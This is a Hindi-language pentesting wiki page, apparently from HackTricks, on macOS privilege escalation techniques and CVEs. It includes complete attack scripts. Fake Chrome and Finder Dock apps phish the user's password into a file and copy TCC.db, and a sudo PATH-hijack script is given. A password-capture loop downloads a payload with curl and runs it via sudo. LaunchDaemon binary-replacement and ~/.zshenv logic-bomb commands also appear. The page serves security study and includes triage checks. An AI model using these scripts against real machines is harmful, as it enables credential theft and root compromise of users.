# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

अगर आप TCC privilege escalation के बारे में जानने आए हैं, तो यहाँ जाएँ:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Linux या अन्य Unix-like systems को प्रभावित करने वाली privilege-escalation की कई techniques macOS पर भी लागू होती हैं। देखें:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

आप मूल [Sudo Hijacking technique को Linux Privilege Escalation पोस्ट में](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) पा सकते हैं।

हालाँकि, macOS **उपयोगकर्ता का `PATH` बनाए रखता है**, जब वह **`sudo`** चलाता है। इसका मतलब है कि इस attack को अंजाम देने का एक और तरीका उन **दूसरे binaries को hijack करना** है जिन्हें victim **sudo चलाते समय** निष्पादित करता है:

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

ध्यान दें कि जो user terminal का उपयोग करता है, उसके **Homebrew installed** होने की बहुत संभावना है। इसलिए **`/opt/homebrew/bin`** में binaries को hijack करना संभव है।

### Dock प्रतिरूपण

कुछ **social engineering** का उपयोग करके, आप Dock में **उदाहरण के लिए Google Chrome का प्रतिरूपण** कर सकते हैं और वास्तव में अपनी script execute कर सकते हैं:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
कुछ सुझाव:

- Dock में देखें कि Chrome है या नहीं। अगर है, तो उस entry को **हटा दें** और Dock array में उसी position पर **fake Chrome entry जोड़ें**।

<details>
<summary>Chrome Dock प्रतिरूपण script</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
कुछ सुझाव:

- आप **Finder को Dock से हटा नहीं सकते**, इसलिए अगर आप उसे Dock में जोड़ने वाले हैं, तो नकली Finder को असली Finder के ठीक बगल में रख सकते हैं। इसके लिए आपको **Dock array की शुरुआत में नकली Finder entry जोड़नी होगी**।
- दूसरा विकल्प है कि उसे Dock में न रखें और बस खोलें; "Finder asking to control Finder" इतना अजीब नहीं है।
- बिना पासवर्ड पूछे **root तक escalate करने** का एक और विकल्प, जिसमें एक भयानक डायलॉग बॉक्स दिखेगा, यह है कि Finder से किसी privileged action के लिए सचमुच पासवर्ड माँगवाएँ:
  - Finder से एक नई **`sudo`** फ़ाइल **`/etc/pam.d`** में कॉपी करने को कहें (पासवर्ड माँगने वाला prompt बताएगा कि "Finder wants to copy sudo")
  - Finder से एक नया **Authorization Plugin** कॉपी करने को कहें (आप फ़ाइल का नाम नियंत्रित कर सकते हैं, ताकि पासवर्ड माँगने वाला prompt बताए कि "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware अक्सर user interaction का दुरुपयोग करके **sudo-capable password capture** करता है और उसे programmatically reuse करता है। एक सामान्य flow:

1. `whoami` से logged in user की पहचान करें।
2. `dscl . -authonly "$user" "$pw"` के सफल होने तक **password prompts को loop करें**।
3. Credential cache करें (उदाहरण के लिए, `/tmp/.pass`) और privileged actions के लिए `sudo -S` (stdin पर password) का उपयोग करें।

न्यूनतम chain का उदाहरण:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

चुराए गए पासवर्ड का फिर से इस्तेमाल **`xattr -c` से Gatekeeper quarantine हटाने**, LaunchDaemons या अन्य privileged files कॉपी करने और बिना इंटरैक्शन के अतिरिक्त stages चलाने के लिए किया जा सकता है।<sup>[[1]](#references)</sup>

## macOS के नए विशिष्ट vectors (2023–2026)

### Deprecated `AuthorizationExecuteWithPrivileges` अब भी उपयोग किया जा सकता है

`AuthorizationExecuteWithPrivileges` को 10.7 में deprecated कर दिया गया था, लेकिन **यह अब भी Sonoma/Sequoia पर काम करता है**। कई commercial updaters किसी untrusted path के साथ `/usr/libexec/security_authtrampoline` चलाते हैं। अगर target binary user-writable है, तो आप trojan रखकर वैध prompt का फायदा उठा सकते हैं:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

ऊपर दी गई **masquerading tricks** के साथ मिलाकर एक विश्वसनीय password dialog दिखाएँ।


### Privileged helper / XPC triage

कई आधुनिक third-party macOS privescs एक ही पैटर्न का पालन करते हैं: एक **root LaunchDaemon**, **`/Library/PrivilegedHelperTools`** से **Mach/XPC service** expose करता है, फिर helper या तो **client को validate नहीं करता**, उसे **बहुत देर से** validate करता है (PID race), या ऐसा **root method** expose करता है जो **user-controlled path/script** का उपयोग करता है। VPN clients, game launchers और updaters में हाल के कई helper bugs के पीछे यही bug class है।<sup>[[2]](#references)</sup>

त्वरित triage checklist:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

ऐसे helpers पर विशेष ध्यान दें जो:

- `launchd` में job loaded रहने के कारण **uninstall के बाद भी** requests स्वीकार करते रहें
- **`/Applications/...`** या non-root users द्वारा लिखे जा सकने वाले अन्य paths से scripts execute करें या configuration पढ़ें
- **PID-based** या **bundle-id-only** peer validation पर निर्भर हों, जिनमें race condition का फायदा उठाया जा सकता है

Helper authorization bugs के बारे में अधिक जानकारी के लिए [यह पेज](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md) देखें।

### PackageKit script environment inheritance (CVE-2024-27822)

Apple द्वारा **Sonoma 14.5**, **Ventura 13.6.7** और **Monterey 12.7.5** में इसे ठीक करने तक, **`Installer.app`** / **`PackageKit.framework`** के ज़रिए user द्वारा शुरू किए गए installs, **PKG scripts को मौजूदा user के environment में root के रूप में execute** कर सकते थे। इसका अर्थ है कि **`#!/bin/zsh`** का उपयोग करने वाला package, victim द्वारा package install किए जाने पर attacker की **`~/.zshenv`** load करके उसे **root** के रूप में चला सकता था।<sup>[[3]](#references)</sup>

यह **logic bomb** के रूप में खास तौर पर दिलचस्प है: आपको बस user के account में foothold और लिखे जा सकने वाला shell startup file चाहिए; फिर आप किसी भी vulnerable **zsh-based** installer के user द्वारा execute किए जाने का इंतज़ार कर सकते हैं। यह आम तौर पर **MDM/Munki** deployments पर लागू नहीं होता, क्योंकि वे root user के environment में चलते हैं।<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

यदि आप installer-विशिष्ट दुरुपयोग को और गहराई से समझना चाहते हैं, तो [यह पेज](macos-files-folders-and-binaries/macos-installers-abuse.md) भी देखें।

### `.localized` के ज़रिए installer destination collision

कुछ third-party installers एक root LaunchDaemon register करते हैं, जिसका executable `/Applications/Target.app` के अंदर एक fixed path से reference किया जाता है। यदि कोई attacker उस bundle को पहले **एक अलग bundle identifier** के साथ बना सकता है, तो Installer decoy को बनाए रख सकता है और असली app को `/Applications/Target.localized/Target.app` में रख सकता है। Daemon अब भी मूल path की ओर इशारा करता है। इसलिए, decoy bundle के अंदर attacker-controlled executable बाद में root के रूप में चल सकता है।<sup>[[8]](#references)</sup>

महत्वपूर्ण पूर्व-शर्तें हैं:<sup>[[8]](#references)</sup>

1. Attacker अपेक्षित application path बना या नियंत्रित कर सकता हो।
2. Package परस्पर विरोधी bundle को न हटाता हो।
3. Privileged job उस bundle के अंदर hard-coded path का उपयोग करता हो।
4. User या MDM workflow package install करके job register करे।

Relocated bundles खोजें और फिर अगले section में enumeration loop से LaunchDaemon targets की समीक्षा करें:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

एक अधिक सुरक्षित installer अंतिम bundle location को resolve करता है और privileged executables को root-owned location, जैसे `/Library/PrivilegedHelperTools`, में रखता है। Job को register या start करने से पहले उसे ownership और code signing भी verify करनी चाहिए।<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

LaunchDaemon plist root-owned हो सकती है, जबकि उसका `Program` या पहला `ProgramArguments` entry किसी user-writable directory की ओर point करता हो। केवल executable mode नहीं, **पूरा path** जाँचें। अगर parent directory writable है, तो attacker root-owned executable का नाम बदलकर उसी path पर replacement बना सकता है। अगली बार job शुरू होने पर replacement root के रूप में चलेगा। Reboot या सामान्य service restart पर्याप्त है। Attacker को system domain में `launchctl bootstrap` चलाने की permission की ज़रूरत नहीं है।<sup>[[7]](#references)</sup>

पहले हर target और उसके immediate parent की सूची बनाएँ:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

जब फ़ाइल या उसकी parent directory writable हो, तो original binary को सुरक्षित रखें और उस path को executable payload से बदल दें। फिर पहले से loaded daemon के restart होने का इंतज़ार करें।<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR credential-pointer race (CVE-2025-24118)

कमज़ोर `kauth_cred_proc_update` path, SMR readers द्वारा बिना lock के pointer load किए जाने के दौरान, non-atomic `zalloc_ro_mut` API का उपयोग करके `proc_ro.p_ucred` को अपडेट करता था। सार्वजनिक trigger में विशेष रूप से तैयार की गई setgid binary का उपयोग होता है। एक thread अपने real और effective group IDs के बीच switch करता है, जबकि दूसरा thread बार-बार `getgid()` जैसे syscall में प्रवेश करता है।<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

इसे तैयार root exploit के बजाय **race primitive** मानें। प्रकाशित PoC torn credential pointer दिखाता है। इसका आम नतीजा kernel panic होता है। शोधकर्ता ने corruption को केवल Intel पर reproduce किया और इससे बनने वाले credential object पर deterministic control नहीं दिखाया। Apple ने macOS 15.3 में update को atomic pointer exchange में बदल दिया।<sup>[[4]](#references)</sup>

### Migration Assistant के ज़रिए SIP bypass ("Migraine", CVE-2023-32369)

अगर आपके पास पहले से root access है, तब भी SIP system locations पर लिखने से रोकता है। **Migraine** bug, Migration Assistant entitlement `com.apple.rootless.install.heritable` का दुरुपयोग करके ऐसा child process spawn करता है जो SIP bypass विरासत में पाता है और protected paths (जैसे `/System/Library/LaunchDaemons`) को overwrite कर देता है।<sup>[[5]](#references)</sup> इसकी chain:

1. Live system पर root access प्राप्त करें।
2. Attacker-controlled binary चलाने के लिए crafted state के साथ `systemmigrationd` trigger करें।
3. विरासत में मिले entitlement का उपयोग करके SIP-protected files patch करें; reboot के बाद भी ये बदलाव बने रहते हैं।

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Apple के कई daemons XPC के ज़रिए **NSPredicate** objects स्वीकारते हैं और केवल `expressionType` field को validate करते हैं, जिसे attacker नियंत्रित कर सकता है। ऐसा predicate बनाकर, जो मनमाने selectors evaluate करे, आप **root/system XPC services** (जैसे `coreduetd`, `contextstored`) में **code execution** हासिल कर सकते हैं। इसे शुरुआती app sandbox escape के साथ इस्तेमाल करने पर **user prompts के बिना privilege escalation** मिलती है। ऐसे XPC endpoints खोजें जो predicates deserialize करते हों और जिनमें robust visitor न हो।<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass और privilege escalation

**कोई भी user** (यहाँ तक कि unprivileged user भी) `-o noowners` के साथ Time Machine snapshot बना और mount कर सकता है, और उस snapshot की **सभी files तक पहुँच सकता है**। इससे live volume पर ownership checks bypass हो जाते हैं। इसके लिए बस इतना privilege चाहिए कि इस्तेमाल किए जा रहे application (जैसे `Terminal`) को **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) मिला हो।

Commands और पूरा explanation TCC bypasses page पर हैं:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitive Information

यह privilege escalation के लिए उपयोगी हो सकता है:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, Infostealer का वर्ष](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS के लिए AWS Client VPN में Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS और iOS में एक नया Privilege Escalation Bug Class (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: असुरक्षित folder permissions के ज़रिए privilege escalation और persistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS में .localized directory के ज़रिए LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
